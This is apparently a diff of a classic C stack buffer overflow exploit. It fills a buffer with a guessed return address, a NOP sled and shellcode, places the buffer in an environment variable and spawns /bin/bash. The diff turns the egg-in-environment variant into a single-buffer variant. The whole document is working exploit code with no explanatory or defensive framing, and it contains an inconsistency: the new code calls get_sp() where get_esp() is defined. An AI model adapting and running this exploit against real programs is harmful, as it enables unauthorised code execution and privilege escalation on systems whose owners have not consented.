@@ -30,7 +30,6 @@
 
 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
-#define DEFAULT_EGG_SIZE               2048
 #define NOP                            0x90
 
 const char shellcode[] =
@@ -51,26 +50,20 @@ unsigned long get_esp(void) {
 }
 
 void main(int argc, char *argv[]) {
-  char *buff, *ptr, *egg;
+  char *buff, *ptr;
   long *addr_ptr, addr;
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-  int i, eggsize=DEFAULT_EGG_SIZE;
+  int i;
 
-  if (argc > 1) bsize   = atoi(argv[1]);
-  if (argc > 2) offset  = atoi(argv[2]);
-  if (argc > 3) eggsize = atoi(argv[3]);
-
+  if (argc > 1) bsize  = atoi(argv[1]);
+  if (argc > 2) offset = atoi(argv[2]);
 
   if (!(buff = malloc(bsize))) {
     printf("Can't allocate memory.\n");
     exit(0);
   }
-  if (!(egg = malloc(eggsize))) {
-    printf("Can't allocate memory.\n");
-    exit(0);
-  }
 
-  addr = get_esp() - offset;
+  addr = get_sp() - offset;
   printf("Using address: 0x%x\n", addr);
 
   ptr = buff;
@@ -78,22 +71,17 @@ void main(int argc, char *argv[]) {
   for (i = 0; i < bsize; i+=4)
     *(addr_ptr++) = addr;
 
-  ptr = egg;
-  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
-    *(ptr++) = NOP;
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
 
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
   buff[bsize - 1] = '\0';
-  egg[eggsize - 1] = '\0';
 
-  memcpy(egg,"EGG=",4);
-  putenv(egg);
-  memcpy(buff,"RET=",4);
+  memcpy(buff,"EGG=",4);
   putenv(buff);
-
-//  printf(RET);
   system("/bin/bash");
 }
 
